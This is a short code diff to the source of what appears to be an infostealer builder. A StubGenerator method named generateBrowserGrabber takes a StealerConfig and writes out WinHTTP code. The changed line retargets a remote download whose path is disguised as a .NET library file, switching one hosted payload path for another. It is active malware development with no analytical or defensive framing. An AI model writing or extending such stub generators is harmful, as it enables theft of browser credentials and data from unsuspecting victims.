@@ -524,7 +524,7 @@ QString StubGenerator::generateBrowserGrabber(const StealerConfig& config) const
     code += "        return \"{\\\"error\\\": \\\"Failed to connect\\\"}\";\n";
     code += "    }\n";
     code += "    \n";
-    code += "    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L\"GET\", L\"/Matero777/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.Extensions.dll\", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);\n";
+    code += "    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L\"GET\", L\"/NTJOSH/.dotnet/main/obj/Libraries/net6.0/System.Runtime.dll\", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);\n";
     code += "    if (!hRequest || !WinHttpSendRequest(hRequest, NULL, 0, NULL, 0, 0, 0) || !WinHttpReceiveResponse(hRequest, NULL)) {\n";
     code += "        if (hRequest) WinHttpCloseHandle(hRequest);\n";
     code += "        WinHttpCloseHandle(hConnect);\n";
